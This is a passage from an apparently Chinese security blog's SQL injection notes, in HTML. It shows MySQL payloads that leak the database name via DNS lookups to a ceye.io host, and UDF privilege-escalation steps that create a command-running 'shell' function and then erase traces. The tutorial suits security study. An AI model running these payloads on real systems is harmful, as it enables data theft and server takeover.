<span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">2.03</span> sec<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>返回时间有几秒就说明有几个数据，可以调整一下sleep的时间</p>
<h2 id="mysql-带外注入"><a href="#mysql-带外注入" class="headerlink" title="mysql 带外注入"></a>mysql 带外注入</h2><h3 id="UNC-Universal-Naming-Convention"><a href="#UNC-Universal-Naming-Convention" class="headerlink" title="UNC(Universal Naming Convention)"></a>UNC(Universal Naming Convention)</h3><p>UNC为网络（主要指局域网）上资源的完整 Windows 2000 名称<br>格式为：\servername\sharename\directory\filename<br>mysql的load_file函数支持这种路径格式来加载外部文件，所以只能适用于windows的操作系统</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="/2018/05/26/sql/1.bmp"><br>如果本地hosts文件和本地dns解析器都没有与域名对应的映射关系，则会去查找本地dns服务器，如果本地DNS服务器本地区域文件与缓存解析都失效，且本地DNS服务器未用转发模式，本地DNS就把请求发至13台根DNS，然后按照上图依次查询。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">SELECT</span> CONCAT<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.qlcegs.ceye.io\\abc.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">---------------------------------------------------------------+</span>
<span class="token operator">|</span> CONCAT<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.qlcegs.ceye.io\\abc.txt'</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">---------------------------------------------------------------+</span>
<span class="token operator">|</span> \\security<span class="token punctuation">.</span>qlcegs<span class="token punctuation">.</span>ceye<span class="token punctuation">.</span>io\<span class="token number">abc</span><span class="token punctuation">.</span>txt                             <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">---------------------------------------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">/*前一个反斜线起转义作用*/</span>

mysql<span class="token operator">></span> <span class="token keyword">SELECT</span> load_file<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.qlcegs.ceye.io\\abc.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在dns上看到的效果：<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2018/05/26/sql/1.png" alt="1" data-caption="1" loading="lazy"></p>
<h2 id="mysql-udf提权"><a href="#mysql-udf提权" class="headerlink" title="mysql udf提权"></a>mysql udf提权</h2><h3 id="dll"><a href="#dll" class="headerlink" title="dll"></a>dll</h3><p>在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p>
<h3 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h3><p>在mysql版本&gt;5.1时，udf要求导出到mysql&#x2F;lib&#x2F;plugin目录下，且默认不存在<br>可以使用ads流创建文件夹</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'lib'</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'E:\\phpStudy\\PHPTutorial\\MySQL\\lib::$INDEX_ALLOCATION'</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token string">'plugin'</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'E:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION'</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/*自己实验失败 errcode 13 没找到解决方法*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h3><p>可以用webshell创建plugin目录后找任意的地方上传udf.dll文件<br>再导出到plugin目录<br>创建函数，必须有数据库insert权限，因为操作会在mysql.func系统表中添加一行记录</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">"C:/phpStudy/PHPTutorial/WWW/udf.dll"</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'C/phpStudy/PHPTutorial/MySQL/lib/plugin/udf.dll'</span><span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">function</span> shell <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'udf.dll'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>没有webshell或者上传业务的话可以这样做</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'c:/udf.dll'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*得到dll的16进制*/</span>
<span class="token keyword">select</span> unhex<span class="token punctuation">(</span><span class="token string">'udf.dll hex code'</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'C/phpStudy/PHPTutorial/MySQL/lib/plugin/udf.dll'</span><span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">function</span> shell <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'udf.dll'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>随后就可以来执行系统命令，还可以擦除痕迹</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> shell<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"net user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">drop</span> <span class="token keyword">function</span> shell<span class="token punctuation">;</span>
<span class="token keyword">delete</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>func <span class="token keyword">where</span> name <span class="token operator">=</span> <span class="token string">'shell'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

    
  </article>

  
      

  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/sqli/" rel="tag">sqli</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1689950583516"></script>
  

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div>
</div>
        <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%8F%82%E6%95%B0%E5%8C%85%E8%A3%B9"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 参数包裹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%B5%8B%E8%AF%95WAF"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 测试WAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%B5%8B%E8%AF%95payload"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 测试payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%88%E6%9C%89%E6%95%B0%E6%8D%AE%E5%9B%9E%E6%98%BE%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 联合查询（有数据回显的时候）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88union%E8%A2%ABwaf%E6%88%96%E8%80%85%E6%B2%A1%E6%9C%89%E6%95%B0%E6%8D%AE%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 报错注入（union被waf或者没有数据回显）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-bool%E7%9B%B2%E6%B3%A8%EF%BC%88%E6%AD%A3%E7%A1%AE%E5%92%8C%E9%94%99%E8%AF%AF%E4%B8%A4%E7%A7%8D%E7%BB%93%E6%9E%9C%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">0X03 bool盲注（正确和错误两种结果）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%8F%AA%E6%9C%89%E4%B8%80%E7%A7%8D%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">0x04 时间盲注（只有一种返回结果）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88%E8%BD%AC%E4%B9%89%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">宽字节注入（转义单引号）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sprintf%E9%80%83%E9%80%B8%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">3.2.</span> <span class="toc-text">sprintf逃逸单引号</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#load-file%E5%92%8Coutfile"><span class="toc-number">4.</span> <span class="toc-text">load_file和outfile</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E5%92%8C%E5%8F%98%E9%87%8F"><span class="toc-number">4.1.</span> <span class="toc-text">mysql常见的系统函数和变量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%94%A8%E9%80%94"><span class="toc-number">4.2.</span> <span class="toc-text">常见用途</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#outfile%E5%92%8Cdumpfile%E5%8C%BA%E5%88%AB"><span class="toc-number">4.3.</span> <span class="toc-text">outfile和dumpfile区别</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BD%99%E6%93%8D%E4%BD%9C"><span class="toc-number">5.</span> <span class="toc-text">其余操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#update-insert-re%E5%A4%B4-cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">update,insert,re头,cookie注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF"><span class="toc-number">5.2.1.</span> <span class="toc-text">强网杯</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hpf-http%E5%88%86%E5%89%B2%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.</span> <span class="toc-text">hpf http分割注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E8%A1%A8%E5%90%8D%E4%B8%8D%E7%9F%A5%E5%AD%97%E6%AE%B5%E5%90%8D%E7%9B%B4%E6%8E%A5%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-number">5.4.</span> <span class="toc-text">已知表名不知字段名直接爆数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#limit-%E6%B3%A8%E5%85%A5"><span class="toc-number">5.5.</span> <span class="toc-text">limit 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#order-by-%E6%B3%A8%E5%85%A5"><span class="toc-number">5.6.</span> <span class="toc-text">order by 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-number">5.7.</span> <span class="toc-text">mysql 带外注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UNC-Universal-Naming-Convention"><span class="toc-number">5.7.1.</span> <span class="toc-text">UNC(Universal Naming Convention)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">5.7.1.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">5.7.2.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-udf%E6%8F%90%E6%9D%83"><span class="toc-number">5.8.</span> <span class="toc-text">mysql udf提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dll"><span class="toc-number">5.8.1.</span> <span class="toc-text">dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#plugin"><span class="toc-number">5.8.2.</span> <span class="toc-text">plugin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="toc-number">5.8.3.</span> <span class="toc-text">创建函数</span></a></li></ol></li></ol></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
    </div>
    <div id="nexmoe-search-space">
	<div class="search-container">
		<div class="search-header">
			<div class="search-input-container">
				<input
					class="search-input"
					type="text"
					placeholder="Search"
					oninput="sinput();"
				/>
			</div>
			<a class="search-close" onclick="sclose();">×</a>
		</div>
		<div class="search-body"></div>
	</div>
</div>

    
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>

</body>

</html>
